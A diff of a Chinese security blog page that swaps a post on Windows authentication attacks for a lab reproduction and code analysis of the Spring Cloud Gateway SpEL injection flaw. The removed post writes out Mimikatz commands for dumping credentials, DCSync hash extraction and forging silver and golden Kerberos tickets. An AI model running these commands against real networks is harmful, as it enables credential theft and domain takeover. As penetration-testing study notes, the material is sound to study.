@@ -4,9 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Windows安全认证入门, jokerscar&#39;blogs">
-    <meta name="description" content="Sam文件sam文件存放在%SystemRoot%\system32\config\sam 是系统Windows的账户的数据库文件。用户在登录时系统会自动读取sam中的认证对比，认证成功后登录
-NTLMNTLM是NT LAN Manager">
+    <meta name="keywords" content="Spring Cloud Gateway表达式注入(未完成内存马注入), jokerscar&#39;blogs">
+    <meta name="description" content="漏洞复现 
+环境搭建 
+直接使用vulhub(https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947) 中的项目，为演示方便将项目从docker中的spring-">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +19,7 @@ NTLMNTLM是NT LAN Manager">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Windows安全认证入门 | jokerscar&#39;blogs</title>
+    <title>Spring Cloud Gateway表达式注入(未完成内存马注入) | jokerscar&#39;blogs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -288,12 +289,12 @@ NTLMNTLM是NT LAN Manager">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Windows安全认证入门</h1>
+                    <h1 class="description center-align post-title">Spring Cloud Gateway表达式注入(未完成内存马注入)</h1>
                 </div>
             </div>
         </div>
@@ -409,16 +410,8 @@ NTLMNTLM是NT LAN Manager">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">内网渗透</span>
-                            </a>
-                        
-                            <a href="/tags/Windows%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">Windows安全</span>
-                            </a>
-                        
-                            <a href="/tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/">
-                                <span class="chip bg-color">内网横向</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                <span class="chip bg-color">漏洞分析</span>
                             </a>
                         
                     </div>
@@ -429,8 +422,8 @@ NTLMNTLM是NT LAN Manager">
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                内网渗透
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
+                                漏洞分析
                             </a>
                         
                     </div>
@@ -442,7 +435,7 @@ NTLMNTLM是NT LAN Manager">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-13
+                    2022-03-19
                 </div>
                 
 
@@ -463,110 +456,45 @@ NTLMNTLM是NT LAN Manager">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Sam文件"><a href="#Sam文件" class="headerlink" title="Sam文件"></a>Sam文件</h2><p>sam文件存放在%SystemRoot%\system32\config\sam 是系统Windows的账户的数据库文件。用户在登录时系统会自动读取sam中的认证对比，认证成功后登录</p>
-<h2 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a><em>NTLM</em></h2><p>NTLM是NT LAN Manager的缩写，这也说明了协议的来源。NTLM 是指 telnet的一种验证身份方式，即问询&#x2F;应答身份验证协议，是 Windows NT 早期版本的标准安全协议，Windows 2000支持 NTLM 是为了保持向后兼容。Windows 2000内置三种基本安全协议之一。</p>
-<h3 id="NTLM-NT-LAN-Manager-Hash"><a href="#NTLM-NT-LAN-Manager-Hash" class="headerlink" title="NTLM(NT LAN Manager) Hash"></a>NTLM(NT LAN Manager) Hash</h3><p>NTLM Hash 是</p>
-<p>生成方式</p>
-<p>1、将明文口令转换成16进制格式</p>
-<p>2、转换成unicode格式</p>
-<p>3、对Unicode字符串作md4加密，生成32位的十六进制数字串</p>
-<p><img src="/2022/03/13/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%85%A5%E9%97%A8/image-20220313160540699.png" alt="image-20220313160540699"></p>
-<p>如图所示，password经过ntlm hash加密后是8846f7eaee8fb117ad06bdd830b7586c</p>
-<h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><p>Windows Logon Process(winlogon.exe)接收用户输入信息</p>
-<p>winlogon进程将用户输入的内容传递给lsass.exe进程使用NTML hash对口令加密</p>
-<p>用加密结果对比SAM数据库中的内容对比</p>
-<p>结果相同则返回userid和groupid发送给winlogon</p>
-<p>结果不同则登录失败</p>
-<h3 id="工作组环境NTML认证"><a href="#工作组环境NTML认证" class="headerlink" title="工作组环境NTML认证"></a>工作组环境NTML认证</h3><ol>
-<li>（仅交互式身份验证存在此步骤）用户访问<strong>客户机</strong>并提供域名，用户名，密码。客户端计算密码的Hash，并丢弃实际密码</li>
-<li>客户端将用户名发送到服务器</li>
-<li>服务器生成一个16字节的随机数Challenge并发送给客户端</li>
-<li>客户端使用用户密码的Hash对Challenge进行加密，然后将结果response(Net-NTLM hash)返回给服务器</li>
-<li>服务器使用用户名从SAM数据库中检索用户密码Hash，使用此密码Hash对Challenge进行加密</li>
-<li>服务器将其加密的Challenge（在步骤5中）与客户端计算的response（在步骤4中）进行比较。如果它们相同则身份验证成功</li>
-</ol>
-<h3 id="域环境NTML认证"><a href="#域环境NTML认证" class="headerlink" title="域环境NTML认证"></a>域环境NTML认证</h3><ol>
-<li>（仅交互式身份验证存在此步骤）用户访问<strong>客户机</strong>并提供域名，用户名，密码。客户端计算密码的Hash，并丢弃实际密码</li>
-<li>客户端将用户名发送到服务器</li>
-<li>服务器生成一个16字节的随机数Challenge并发送给客户端</li>
-<li>客户端使用用户密码的Hash对Challenge进行加密，然后将结果response(Net-NTLM hash)返回给服务器</li>
-<li>服务器将三个信息发送到域控制器：用户名，发送给客户机的Challenge，返回给服务器的response</li>
-<li>域控制器使用用户名从SAM数据库中检索用户密码Hash。使用此密码Hash对Challenge进行加密</li>
-<li>域控制器将其加密的Challenge（在步骤6中）与客户端计算的response（在步骤4中）进行比较。如果它们相同则身份验证成功</li>
-</ol>
-<p>ntml v1: challenge 8位 DES加密算法</p>
-<p>ntml v2: challenge16位 HMAC-MD5算法</p>
-<h3 id="PTH-Pash-The-Hash-hash传递攻击"><a href="#PTH-Pash-The-Hash-hash传递攻击" class="headerlink" title="PTH(Pash The Hash)hash传递攻击"></a>PTH(Pash The Hash)hash传递攻击</h3><p>hash传递就是使用用户名对应的NTML Hash将服务器给出的chanllenge加密，生成一个response，来完成认证</p>
-<p>hash传递所需条件：</p>
-<p>1、能与被认证机器通信</p>
-<p>2、hash传递需要被传递认证的用户名</p>
-<p>3、hash传递需要被传递认证用户的NTML Hash</p>
-<p>常用工具：</p>
-<p>smbmap</p>
-<p>CrackMapExec</p>
-<p>impacket</p>
-<p>metasploit</p>
-<h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a><em>Kerberos</em></h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 &#x2F; 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。</p>
-<p>域认证所参与的角色</p>
-<p>1、Client(客户端)</p>
-<p>2、Server(服务端)</p>
-<p>3、KDC(Key Distribution Center) &#x3D; DC（一般由域控担任这个角色）</p>
-<p><img src="/2022/03/13/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%85%A5%E9%97%A8/201101242156364484.png" alt="img"></p>
-<p>AD(account database):存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT</p>
-<p>Authentication Svervice: 为client生成TGT的服务,以下简称AS</p>
-<p>Ticket Granting Service: 为client生成某个服务ticket,以下简称TGS</p>
-<h3 id="域认证流程概述"><a href="#域认证流程概述" class="headerlink" title="域认证流程概述"></a>域认证流程概述</h3><p>第一步</p>
-<p>client向kerberos服务请求并发送明文身份信息(username&#x2F;host)，希望获取server 的访问权限（如上图①流程），KDC的Authentication Svervice处理身份信息通过AD查询client发送的身份信息是否存在，如果存在AS会产生一个随机的TGS session key用于与TGS通信。然后AS会发送两部分信息回客户端(如上图②流程)。一部分是TGT（Ticket Granting Ticket），用KDC自己的密码进行加密，其内容包含客户端信息、TGS信息和session key;另一部分信息通过客户端的密码加密只包含了TGS信息和session key。如果密码是正确的，那么在本地就可以解密出TGS session key。</p>
-<p>第二步</p>
-<p>完成第一步开始与TGS通信，首先向TGS发送请求（如上图③所示），请求中包含第一步完成后本地缓存的未解密TGT、客户端请求的服务信息、session key加密的authenticator。TGS收到信息后开始检查数据库中是否包含请求的服务名，如果没有，则返回错误信息，如果存在，则通过KDC的密码解密TGT，得到session key解密Authenticator验证身份。然后向client返回信息（如上图④所示），返回的信息包括TGS session key加密生成的service session key 和用server服务器生成的ST(service ticket)</p>
-<p>第三步</p>
-<p>最后在与server的正常通信都可以用server session key和ST进行认证如上图⑤⑥所示</p>
-<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。</p>
-<h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><p>1、不需要与KDC进行交互</p>
-<p>2、需要目标服务的NTLM Hash</p>
-<h4 id="伪造白银票据的Mimikatz命令"><a href="#伪造白银票据的Mimikatz命令" class="headerlink" title="伪造白银票据的Mimikatz命令:"></a>伪造白银票据的Mimikatz命令:</h4><p>#获取SID和hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<p>sekurlsa::logonpasswords</p>
-<p>#制作票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt</span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:cyberpeace.com /sid:S-1-5-21-2718660907-658632824-2072795563 /target:scene.cyberpeace.com /service:cifs /rc4:9a68826fdc2811f20d1f73a471ad7b9a /user:test /ptt</span><br></pre></td></tr></table></figure>
-
-<p>由于白银票据需要目标服务器的Hash,所以没办法生成对应域内所有服务器的票据，也不能通过TGT申请。因此只能针对服务器上的某些服务去伪造，伪造的服务类型列表如下：</p>
-<p><img src="/2022/03/13/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%85%A5%E9%97%A8/image-20220313211821160.png" alt="image-20220313211821160"></p>
-<h4 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h4><p>1、防止服务器凭证不被窃取</p>
-<p>2、开启PAC</p>
-<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。</p>
-<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>1、需要与DC通信</p>
-<p>2、需要krbtgt用户(kdc服务对应的用户)的hash</p>
-<h4 id="伪造黄金票据的Mimikatz命令"><a href="#伪造黄金票据的Mimikatz命令" class="headerlink" title="伪造黄金票据的Mimikatz命令:"></a>伪造黄金票据的Mimikatz命令:</h4><p>获取krbtgt用户hash</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /domain:cyberpeace.com /all /csv   获取域内用户hash</span><br><span class="line">mimikatz(commandline) # lsadump::dcsync /domain:cyberpeace.com /user:krbtgt   获取域SID值</span><br></pre></td></tr></table></figure>
-
-<p>制作黄金票据</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden /admin:system /domain:cyberpeace.com /sid:S-1-5-21-97341123-1865264218-933115267 /krbtgt:95972cdf7b8dde854e74c1871f6d80a0 /ticket:ticket.kirbi&quot; exit</span><br><span class="line"></span><br><span class="line">/admin：伪造的用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：SID值，注意是去掉最后一个-后面的值</span><br><span class="line">/krbtgt：krbtgt的HASH值</span><br><span class="line">/ticket：生成的票据名称    //不是写入内存中的命令！</span><br></pre></td></tr></table></figure>
-
-<p>导入金票</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge         </span><br><span class="line">mimikatz # kerberos::ptt ticket.kirbi</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Windows-Access-Token"><a href="#Windows-Access-Token" class="headerlink" title="Windows Access Token"></a><em>Windows Access Token</em></h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>Windows Token其实叫Access Token(访问令牌)，它是一个描 述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程 时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该 进程没有B用户的权限。</p>
-<p>这也就解释了A用户创建一个进程而该进程没有B用户的权限，因为默认打开一个进程都是以自身的令牌去验证启动的。</p>
-<p>1.Access Token种类</p>
-<ul>
-<li>主令牌（Primary令牌）</li>
-<li>模拟令牌（Impersonation令牌）</li>
-</ul>
-<h3 id="Windows-Access-Token令牌伪造"><a href="#Windows-Access-Token令牌伪造" class="headerlink" title="Windows Access Token令牌伪造"></a>Windows Access Token令牌伪造</h3><p><strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有重启机器后才会清除。</strong></p>
-<p>查看目前系统上存在的模拟令牌工具：</p>
-<p>meterpreter:Incognito</p>
-<p>Cobalt Strike-steal_token</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1S4411e7hr">https://www.bilibili.com/video/BV1S4411e7hr</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.360doc.com/content/15/0409/15/261866_461830447.shtml">http://www.360doc.com/content/15/0409/15/261866_461830447.shtml</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/artech/archive/2007/07/05/807492.html">https://www.cnblogs.com/artech/archive/2007/07/05/807492.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/artech/archive/2011/01/25/NTLM.html">https://www.cnblogs.com/artech/archive/2011/01/25/NTLM.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wxh0000mm/article/details/105996397">https://blog.csdn.net/wxh0000mm/article/details/105996397</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wh4am1/p/12844441.html">https://www.cnblogs.com/wh4am1/p/12844441.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wukenaihe/p/3732141.html">https://www.cnblogs.com/wukenaihe/p/3732141.html</a></p>
+                <p><strong>漏洞复现</strong> </p>
+<p><strong>环境搭建</strong> </p>
+<p>直接使用vulhub(<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947">https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22947</a>) 中的项目，为演示方便将项目从docker中的spring-cloud-gateway-0.0.1-SNAPSHOT.jar文件下载至Windows环境下并使用java开启</p>
+<p><strong>rce:</strong></p>
+<p>发送payload创建恶意路由</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEEED.tmp.jpg" alt="img"></p>
+<p>刷新路由执行SpEL表达式</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEEEE.tmp.jpg" alt="img"></p>
+<p><em><strong>*漏洞分析*</strong></em></p>
+<p>在org.springframework.cloud.gateway.support#ShortcutConfigurable.getValue()中使用了SpEL表达式</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEEEF.tmp.jpg" alt="img"></p>
+<p>在这个方法下的normalize调用了getvalue()方法</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEEF0.tmp.jpg" alt="img"></p>
+<p>可以在org.springframework.cloud.gateway.filter.factory#GatewayFilterFactory中观察到GatewayFilterFactory继承了ShortcutConfigurable</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEF01.tmp.jpg" alt="img"></p>
+<p>其中某条getvalue的调用链如下</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEF02.tmp.jpg" alt="img"></p>
+<p>定位到convertToRoute()方法</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEF03.tmp.jpg" alt="img"></p>
+<p>convertToRoute()方法在加载录用时被调用，传入的RouteDefinition属性如下</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEF04.tmp.jpg" alt="img"></p>
+<p>查看官方列出的路由接口定义</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEF05.tmp.jpg" alt="img"></p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEF06.tmp.jpg" alt="img"></p>
+<p>可通过&#x2F;gateway&#x2F;routes&#x2F;{id_route_to_create}创建路由</p>
+<p>然后通过&#x2F;actuator&#x2F;gateway&#x2F;refresh刷新路由，重新加载配置使得路由生效。</p>
+<p>因此攻击者可以添加带有filter的恶意路由，当重新加载路由时，会触发对参数的归一化逻辑，从而导致filter参数value中的SPEL表达式被解析。</p>
+<p><strong>注入内存马</strong></p>
+<p>发送payload</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEF07.tmp.jpg" alt="img"></p>
+<p>刷新路由</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEF09.tmp.jpg" alt="img"></p>
+<p>注入失败</p>
+<p><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEF0A.tmp.png" alt="img"><img src="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/wpsEF1A.tmp.jpg" alt="img"></p>
+<p><em><strong>参考链接</strong></em></p>
+<p><a target="_blank" rel="noopener" href="https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/">https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/murphysec/article/details/123262978">https://blog.csdn.net/murphysec/article/details/123262978</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/lKKOUvWqU1Qpexus5u_3Uw">https://mp.weixin.qq.com/s/lKKOUvWqU1Qpexus5u_3Uw</a></p>
 
                 
             </div>
@@ -593,7 +521,7 @@ NTLMNTLM是NT LAN Manager">
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/03/13/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%85%A5%E9%97%A8/">http://example.com/2022/03/13/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%85%A5%E9%97%A8/</a>
+                    <a href="http://example.com/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/">http://example.com/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -631,16 +559,8 @@ NTLMNTLM是NT LAN Manager">
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">内网渗透</span>
-                                </a>
-                            
-                                <a href="/tags/Windows%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">Windows安全</span>
-                                </a>
-                            
-                                <a href="/tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/">
-                                    <span class="chip bg-color">内网横向</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                    <span class="chip bg-color">漏洞分析</span>
                                 </a>
                             
                         </div>
@@ -688,9 +608,10 @@ NTLMNTLM是NT LAN Manager">
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2022/03/19/Spring-Cloud-Gateway%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E6%9C%AA%E5%AE%8C%E6%88%90%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
@@ -708,9 +629,9 @@ NTLMNTLM是NT LAN Manager">
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -723,6 +644,7 @@ NTLMNTLM是NT LAN Manager">
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -741,13 +663,13 @@ NTLMNTLM是NT LAN Manager">
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/12/Windows%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-leaning/">
+                <a href="/2022/03/13/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%85%A5%E9%97%A8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Windows下密码获取(leaning)">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Windows安全认证入门">
                         
-                        <span class="card-title">Windows下密码获取(leaning)</span>
+                        <span class="card-title">Windows安全认证入门</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -758,7 +680,7 @@ NTLMNTLM是NT LAN Manager">
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-12
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-13
                             </span>
                         <span class="publish-author">
                             
@@ -775,12 +697,16 @@ NTLMNTLM是NT LAN Manager">
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/">
-                        <span class="chip bg-color">密码获取</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
                     </a>
                     
                     <a href="/tags/Windows%E5%AE%89%E5%85%A8/">
                         <span class="chip bg-color">Windows安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/">
+                        <span class="chip bg-color">内网横向</span>
                     </a>
                     
                 </div>
